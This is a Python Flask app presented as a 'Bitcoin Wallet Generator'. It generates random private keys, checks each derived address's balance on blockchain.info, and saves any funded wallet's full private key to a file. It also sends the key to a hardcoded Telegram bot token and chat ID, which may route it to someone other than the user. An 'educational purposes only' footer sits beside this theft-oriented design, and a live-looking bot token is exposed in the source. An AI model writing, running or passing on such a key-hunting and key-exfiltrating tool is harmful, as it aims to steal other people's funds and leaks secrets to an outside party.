import time
import threading
import random
import hashlib
import ecdsa
import base58
import os
import requests
from datetime import datetime
from flask import Flask, render_template_string, jsonify

# ⚙️ Configuration
DEFAULT_PORT = 5000
WALLET_FILE = "btc_wallets.txt"
REQUEST_DELAY = 1.0  # seconds between requests
MAX_CONSOLE_LINES = 1000  # Limit console output to prevent memory issues

# 🔔 Telegram Configuration
TELEGRAM_TOKEN = "8179575092:AAF8neI5SRmghulxlyjuKTVDEutqnHcPURI"
TELEGRAM_CHAT_ID = "7521446360"

app = Flask(__name__)
running = False
console_output = []
generation_thread = None

# 📊 Statistics
stats = {
    "wallets_generated": 0,
    "wallets_with_balance": 0,
    "total_btc_found": 0.0,
    "start_time": None,
    "runtime": "00:00:00"
}

def add_to_console(text, log_type="info"):
    """Add message to console with timestamp and type"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    # Color coding for different message types
    if log_type == "success":
        emoji = "✅"
    elif log_type == "error":
        emoji = "❌"
    elif log_type == "warning":
        emoji = "⚠️"
    elif log_type == "found":
        emoji = "💰"
    elif log_type == "generated":
        emoji = "🔐"
    else:
        emoji = "ℹ️"
    
    log_line = f"[{timestamp}] {emoji} {text}"
    console_output.append(log_line)
    
    # Limit console output to prevent memory issues
    if len(console_output) > MAX_CONSOLE_LINES:
        console_output.pop(0)
    
    print(log_line)

def send_telegram_notification(message):
    """Send notification to Telegram bot"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            add_to_console("Telegram notification sent", "success")
        else:
            add_to_console(f"Telegram error: HTTP {response.status_code}", "error")
    except Exception as e:
        add_to_console(f"Telegram error: {str(e)}", "error")

def generate_btc_wallet():
    """Generate a new Bitcoin wallet address and private key"""
    try:
        # Generate private key
        private_key = ecdsa.SigningKey.generate(curve=ecdsa.SECP256k1)
        private_key_hex = private_key.to_string().hex()
        
        # Get public key
        public_key = private_key.get_verifying_key().to_string()
        
        # Create Bitcoin address
        sha256 = hashlib.sha256(public_key).digest()
        ripemd160 = hashlib.new('ripemd160')
        ripemd160.update(sha256)
        public_key_hash = ripemd160.digest()
        
        # Add version byte (0x00 for mainnet)
        versioned_payload = b'\x00' + public_key_hash
        
        # Calculate checksum
        checksum = hashlib.sha256(hashlib.sha256(versioned_payload).digest()).digest()[:4]
        binary_address = versioned_payload + checksum
        
        # Encode to Base58
        address = base58.b58encode(binary_address).decode('utf-8')
        
        return address, private_key_hex
    except Exception as e:
        add_to_console(f"Wallet generation error: {str(e)}", "error")
        return None, None

def check_btc_balance(address):
    """Check Bitcoin balance for given address"""
    try:
        # Use blockchain.info API with retry logic
        for attempt in range(3):  # 3 retry attempts
            try:
                response = requests.get(
                    f"https://blockchain.info/balance?active={address}",
                    timeout=15,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
                
                if response.status_code == 200:
                    data = response.json()
                    balance = data.get(address, {}).get("final_balance", 0) / 100000000  # Convert satoshi to BTC
                    return balance
                elif response.status_code == 429:  # Rate limit
                    add_to_console("Rate limited, waiting...", "warning")
                    time.sleep(5)
                    continue
                else:
                    add_to_console(f"API error: HTTP {response.status_code}", "warning")
                    
            except requests.exceptions.RequestException as e:
                if attempt < 2:  # Don't log on last attempt
                    add_to_console(f"Request failed (attempt {attempt + 1}/3): {str(e)}", "warning")
                    time.sleep(2)
                    continue
                    
        return None
        
    except Exception as e:
        add_to_console(f"Balance check error: {str(e)}", "error")
        return None

def update_runtime():
    """Update runtime statistics"""
    if stats["start_time"]:
        start = datetime.strptime(stats["start_time"], "%Y-%m-%d %H:%M:%S")
        runtime = datetime.now() - start
        hours, remainder = divmod(int(runtime.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        stats["runtime"] = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

def generation_loop():
    """Main wallet generation loop"""
    stats["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    add_to_console("Starting wallet generation...", "success")
    
    while running:
        try:
            # Generate wallet
            address, private_key = generate_btc_wallet()
            if not address or not private_key:
                time.sleep(REQUEST_DELAY)
                continue
                
            stats["wallets_generated"] += 1
            
            # Log every 100 wallets generated
            if stats["wallets_generated"] % 100 == 0:
                add_to_console(f"Generated {stats['wallets_generated']} wallets...", "info")
            
            add_to_console(f"Checking: {address[:15]}...{address[-10:]}", "generated")
            
            # Check balance
            balance = check_btc_balance(address)
            
            if balance is not None:
                if balance > 0:
                    # Found wallet with balance!
                    stats["wallets_with_balance"] += 1
                    stats["total_btc_found"] += balance
                    
                    success_msg = f"FOUND WALLET! Balance: {balance:.8f} BTC"
                    add_to_console(success_msg, "found")
                    add_to_console(f"Address: {address}", "found")
                    add_to_console(f"Private: {private_key[:12]}...{private_key[-6:]}", "found")
                    
                    # Save to file
                    try:
                        with open(WALLET_FILE, "a", encoding='utf-8') as f:
                            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                            f.write(f"Address: {address}\n")
                            f.write(f"Private Key: {private_key}\n")
                            f.write(f"Balance: {balance:.8f} BTC\n")
                            f.write("-" * 50 + "\n\n")
                        
                        add_to_console("Wallet saved to file", "success")
                    except Exception as e:
                        add_to_console(f"File save error: {str(e)}", "error")
                    
                    # Send Telegram notification
                    telegram_msg = (
                        f"🚨 <b>WALLET WITH BALANCE FOUND!</b>\n\n"
                        f"💰 <b>Balance:</b> {balance:.8f} BTC\n"
                        f"📍 <b>Address:</b> <code>{address}</code>\n"
                        f"🔑 <b>Private Key:</b> <code>{private_key}</code>\n"
                        f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"📊 <b>Total Generated:</b> {stats['wallets_generated']}"
                    )
                    send_telegram_notification(telegram_msg)
                    
                else:
                    # Empty wallet (most common case)
                    if stats["wallets_generated"] % 50 == 0:  # Log every 50th empty wallet
                        add_to_console(f"Empty wallet: {address[:15]}...{address[-10:]}", "info")
            
            # Update runtime
            update_runtime()
            
            # Delay between requests
            time.sleep(REQUEST_DELAY)
            
        except Exception as e:
            add_to_console(f"Generation loop error: {str(e)}", "error")
            time.sleep(REQUEST_DELAY * 2)  # Wait longer on error

@app.route("/")
def index():
    """Main web interface"""
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🔥 Bitcoin Wallet Generator</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
                color: white;
                min-height: 100vh;
                padding: 20px;
            }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { text-align: center; margin-bottom: 30px; }
            .header h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
            .controls { 
                display: flex; 
                justify-content: center; 
                gap: 15px; 
                margin-bottom: 30px;
                flex-wrap: wrap;
            }
            button { 
                padding: 12px 24px; 
                border: none; 
                border-radius: 8px; 
                font-size: 16px; 
                font-weight: bold;
                cursor: pointer; 
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            .btn-start { background: #27ae60; color: white; }
            .btn-stop { background: #e74c3c; color: white; }
            .btn-clear { background: #f39c12; color: white; }
            button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
            .main-content { display: grid; grid-template-columns: 1fr 300px; gap: 30px; }
            .console-section { background: rgba(0,0,0,0.8); border-radius: 12px; padding: 20px; }
            .console { 
                background: #000; 
                color: #00ff00; 
                padding: 15px; 
                height: 400px; 
                overflow-y: auto; 
                border-radius: 8px;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                line-height: 1.4;
                border: 2px solid #333;
            }
            .stats-section { background: rgba(255,255,255,0.1); border-radius: 12px; padding: 20px; }
            .stat-card { 
                background: rgba(255,255,255,0.1); 
                padding: 15px; 
                border-radius: 8px; 
                margin-bottom: 15px;
                text-align: center;
            }
            .stat-value { font-size: 1.8em; font-weight: bold; color: #f1c40f; }
            .stat-label { font-size: 0.9em; opacity: 0.8; margin-top: 5px; }
            .status-indicator { 
                display: inline-block; 
                width: 12px; 
                height: 12px; 
                border-radius: 50%; 
                margin-right: 8px;
            }
            .status-running { background: #27ae60; }
            .status-stopped { background: #e74c3c; }
            @media (max-width: 768px) {
                .main-content { grid-template-columns: 1fr; }
                .controls { flex-direction: column; align-items: center; }
                button { width: 200px; }
            }
            .footer { text-align: center; margin-top: 30px; opacity: 0.7; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔥 Bitcoin Wallet Generator</h1>
                <p>Advanced BTC wallet generation with balance checking</p>
            </div>
            
            <div class="controls">
                <button class="btn-start" onclick="start()">▶️ Start Generation</button>
                <button class="btn-stop" onclick="stop()">⏹️ Stop Generation</button>
                <button class="btn-clear" onclick="clearConsole()">🧹 Clear Console</button>
            </div>
            
            <div class="main-content">
                <div class="console-section">
                    <h3><span id="status-indicator" class="status-indicator status-stopped"></span>Console Output</h3>
                    <div class="console" id="console">
                        {% for line in console_output %}
                        <div>{{ line }}</div>
                        {% endfor %}
                    </div>
                </div>
                
                <div class="stats-section">
                    <h3>📊 Statistics</h3>
                    
                    <div class="stat-card">
                        <div class="stat-value" id="generated">{{ stats.wallets_generated }}</div>
                        <div class="stat-label">Wallets Generated</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-value" id="with_balance">{{ stats.wallets_with_balance }}</div>
                        <div class="stat-label">Wallets with Balance</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-value" id="btc_found">{{ "%.8f"|format(stats.total_btc_found) }}</div>
                        <div class="stat-label">Total BTC Found</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-value" id="runtime">{{ stats.runtime }}</div>
                        <div class="stat-label">Runtime</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-value" id="rate">0.00</div>
                        <div class="stat-label">Wallets/min</div>
                    </div>
                </div>
            </div>
            
            <div class="footer">
                <p>⚠️ This tool is for educational purposes only. Always comply with local laws and regulations.</p>
            </div>
        </div>

        <script>
            let isRunning = false;
            
            function start() { 
                fetch('/start', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            isRunning = true;
                            updateStatusIndicator();
                        }
                    });
            }
            
            function stop() { 
                fetch('/stop', { method: 'POST' })
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            isRunning = false;
                            updateStatusIndicator();
                        }
                    });
            }
            
            function clearConsole() { 
                fetch('/clear', { method: 'POST' }); 
            }
            
            function updateStatusIndicator() {
                const indicator = document.getElementById('status-indicator');
                if (isRunning) {
                    indicator.className = 'status-indicator status-running';
                } else {
                    indicator.className = 'status-indicator status-stopped';
                }
            }
            
            function calculateRate(generated, runtime) {
                if (!runtime || runtime === "00:00:00") return "0.00";
                const parts = runtime.split(':');
                const totalMinutes = parseInt(parts[0]) * 60 + parseInt(parts[1]) + parseInt(parts[2]) / 60;
                if (totalMinutes === 0) return "0.00";
                return (generated / totalMinutes).toFixed(2);
            }

            // Update console and stats every second
            setInterval(() => {
                fetch('/get_console').then(r => r.json()).then(data => {
                    const console = document.getElementById('console');
                    console.innerHTML = data.output.map(line => `<div>${line}</div>`).join('');
                    console.scrollTop = console.scrollHeight;
                });
                
                fetch('/get_stats').then(r => r.json()).then(data => {
                    document.getElementById('generated').textContent = data.wallets_generated.toLocaleString();
                    document.getElementById('with_balance').textContent = data.wallets_with_balance;
                    document.getElementById('btc_found').textContent = parseFloat(data.total_btc_found).toFixed(8);
                    document.getElementById('runtime').textContent = data.runtime;
                    document.getElementById('rate').textContent = calculateRate(data.wallets_generated, data.runtime);
                });
            }, 1000);
        </script>
    </body>
    </html>
    ''', stats=stats, console_output=console_output)

@app.route("/start", methods=["POST"])
def start():
    """Start wallet generation"""
    global running, generation_thread
    
    if not running:
        running = True
        generation_thread = threading.Thread(target=generation_loop, daemon=True)
        generation_thread.start()
        add_to_console("Wallet generation started!", "success")
        
        # Send start notification to Telegram
        start_msg = (
            f"🚀 <b>BTC Wallet Generator Started!</b>\n"
            f"⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"🔄 <b>Delay:</b> {REQUEST_DELAY}s between requests"
        )
        send_telegram_notification(start_msg)
        
    return jsonify({"success": True})

@app.route("/stop", methods=["POST"])
def stop():
    """Stop wallet generation"""
    global running
    
    if running:
        running = False
        add_to_console("Wallet generation stopped!", "warning")
        
        # Send stop notification to Telegram
        stop_msg = (
            f"🛑 <b>BTC Generator Stopped</b>\n"
            f"📊 <b>Total Generated:</b> {stats['wallets_generated']}\n"
            f"💰 <b>Wallets with Balance:</b> {stats['wallets_with_balance']}\n"
            f"🔥 <b>Total BTC Found:</b> {stats['total_btc_found']:.8f}\n"
            f"⏱️ <b>Runtime:</b> {stats['runtime']}"
        )
        send_telegram_notification(stop_msg)
        
    return jsonify({"success": True})

@app.route("/clear", methods=["POST"])
def clear():
    """Clear console output"""
    global console_output
    console_output = []
    add_to_console("Console cleared", "info")
    return jsonify({"success": True})

@app.route("/get_stats")
def get_stats():
    """Get current statistics"""
    update_runtime()
    return jsonify(stats)

@app.route("/get_console")
def get_console():
    """Get console output"""
    return jsonify({"output": console_output})

if __name__ == "__main__":
    # Initialize
    add_to_console("BTC Wallet Generator initialized!", "success")
    add_to_console(f"Telegram notifications: {'Enabled' if TELEGRAM_TOKEN else 'Disabled'}", "info")
    add_to_console(f"Wallet file: {WALLET_FILE}", "info")
    add_to_console(f"Request delay: {REQUEST_DELAY}s", "info")
    
    # Start Flask app
    try:
        app.run(host="0.0.0.0", port=DEFAULT_PORT, debug=False, threaded=True)
    except Exception as e:
        add_to_console(f"Failed to start server: {str(e)}", "error")